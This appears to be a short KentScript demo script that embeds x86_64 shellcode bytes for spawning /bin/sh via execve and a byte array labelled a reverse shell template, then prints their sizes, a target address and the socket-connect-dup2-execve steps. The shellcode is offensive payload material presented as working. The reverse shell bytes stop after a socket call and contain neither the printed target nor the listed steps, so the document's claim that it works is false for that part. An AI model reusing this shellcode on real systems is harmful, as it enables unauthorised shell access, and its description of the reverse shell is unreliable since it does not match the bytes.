:: KentScript Payload Demo - What Actually Works

:: Shellcode bytes (x86_64 execve /bin/sh)
let SHELLCODE = [
    0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69,
    0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53,
    0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0,
    0x3b, 0x0f, 0x05
];

:: Reverse shell shellcode template
let REVERSE_SHELL = [
    0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6,
    0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x6a, 0x02, 0x5f,
    0x6a, 0x01, 0x5e, 0x6a, 0x29, 0x58, 0x0f, 0x05
];

func print_hex(data) {
    let hex_str = "";
    for byte in data {
        hex_str = hex_str + str(byte) + " ";
    }
    return hex_str;
}

func main() {
    print("=== KentScript Payload Demo ===");
    print("");
    
    print("[*] Shellcode: execve('/bin/sh')");
    print("    Size: " + str(len(SHELLCODE)) + " bytes");
    print("    Bytes: " + str(SHELLCODE));
    print("");
    
    print("[*] Reverse Shell Template");
    print("    Size: " + str(len(REVERSE_SHELL)) + " bytes");
    print("    Target: 192.168.1.100:4444");
    print("");
    
    print("[*] Payload Structure:");
    print("    - socket(AF_INET, SOCK_STREAM, 0)");
    print("    - connect(sockfd, &addr, sizeof(addr))");
    print("    - dup2(sockfd, 0/1/2)");
    print("    - execve('/bin/sh', NULL, NULL)");
    print("");
    
    print("=== Demo Complete ===");
}

main();
